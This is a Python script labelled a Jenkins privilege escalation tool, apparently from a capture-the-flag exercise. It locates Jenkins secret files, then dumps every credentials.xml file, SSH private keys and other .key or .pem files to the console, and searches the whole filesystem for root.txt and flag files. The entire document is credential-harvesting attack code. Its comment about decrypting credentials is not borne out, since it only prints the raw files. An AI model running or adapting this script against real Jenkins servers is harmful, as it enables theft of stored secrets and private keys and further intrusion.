#!/usr/bin/env python3
import os
import subprocess
import base64
import time

print("[+] Jenkins Privilege Escalation Script")

# Try to decrypt Jenkins credentials
try:
    print("[+] Attempting to decrypt Jenkins credentials...")
    master_key_path = "/var/jenkins_home/secrets/master.key"
    hudson_secret_path = "/var/jenkins_home/secrets/hudson.util.Secret"
    
    if os.path.exists(master_key_path) and os.path.exists(hudson_secret_path):
        print("[+] Found master.key and hudson.util.Secret")
        # Try to find credentials.xml files
        cmd = "find /var/jenkins_home -name 'credentials.xml' -type f"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        cred_files = result.stdout.strip().split('\n')
        
        for cred_file in cred_files:
            if cred_file:
                print(f"[+] Found credentials file: {cred_file}")
                cat_cmd = f"cat {cred_file}"
                cat_result = subprocess.run(cat_cmd, shell=True, capture_output=True, text=True)
                print(cat_result.stdout)
except Exception as e:
    print(f"[-] Error: {str(e)}")

# Try to find SSH keys
try:
    print("[+] Looking for SSH keys...")
    cmd = "find /var/jenkins_home -name 'id_rsa*' -o -name '*.pem' -o -name '*.key'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    ssh_keys = result.stdout.strip().split('\n')
    
    for key_file in ssh_keys:
        if key_file:
            print(f"[+] Found key file: {key_file}")
            cat_cmd = f"cat {key_file}"
            cat_result = subprocess.run(cat_cmd, shell=True, capture_output=True, text=True)
            print(cat_result.stdout)
except Exception as e:
    print(f"[-] Error: {str(e)}")

# Try to find the flag
try:
    print("[+] Searching for flag files...")
    cmd = "find / -name 'root.txt' -o -name 'flag.txt' -o -name 'flag' 2>/dev/null"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    flag_files = result.stdout.strip().split('\n')
    
    for flag_file in flag_files:
        if flag_file:
            print(f"[+] Found potential flag file: {flag_file}")
            cat_cmd = f"cat {flag_file} 2>/dev/null || echo 'Cannot read file'"
            cat_result = subprocess.run(cat_cmd, shell=True, capture_output=True, text=True)
            print(cat_result.stdout)
except Exception as e:
    print(f"[-] Error: {str(e)}")

print("[+] Privilege escalation attempts completed")
